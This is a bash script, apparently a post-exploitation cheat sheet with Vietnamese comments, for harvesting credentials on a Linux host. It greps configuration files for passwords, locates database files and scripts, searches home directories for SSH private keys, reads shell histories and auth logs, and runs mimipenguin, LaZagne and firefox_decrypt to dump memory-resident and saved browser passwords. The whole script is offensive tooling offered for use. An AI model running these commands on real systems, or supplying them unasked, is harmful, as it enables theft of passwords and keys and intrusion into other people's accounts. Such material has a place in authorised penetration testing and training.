#!/bin/bash


# search Configuration Files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# credentials in Configuration Files
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

# database
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

# notes
find /home/* -type f -name "*.txt" -o ! -name "*.*"

#script
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

# cron job
cat /etc/crontab

# SSH key
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# public key
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

# history
tail -n5 /home/*/.bash*

# Log
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

# Memory and cache
# Tải tool https://github.com/huntergregal/mimipenguin
python3 mimipenguin.py
bash mimipenguin.sh
# sử dụng lazagne
python2.7 laZagne.py all

# browser
ls -l .mozilla/firefox/ | grep default 
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

# decrypt firefox https://github.com/unode/firefox_decrypt
python3.9 firefox_decrypt.py
python3 laZagne.py browsers
